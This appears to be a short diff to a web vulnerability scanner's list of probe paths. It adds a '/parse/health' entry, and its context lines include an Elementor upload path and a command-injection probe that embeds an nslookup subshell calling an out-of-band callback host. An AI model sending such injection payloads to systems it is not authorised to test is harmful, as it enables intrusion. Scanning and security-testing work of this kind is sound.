@@ -160,3 +160,4 @@
 /wp-content/uploads/elementor/forms/temp/{{uploaded_filename}}
 /rc/?command=shutdown&param=$(nslookup+{{randstr}}.{{interactsh-url}})
 /.well-known/acme-challenge/{{verifier_name}}
+/parse/health
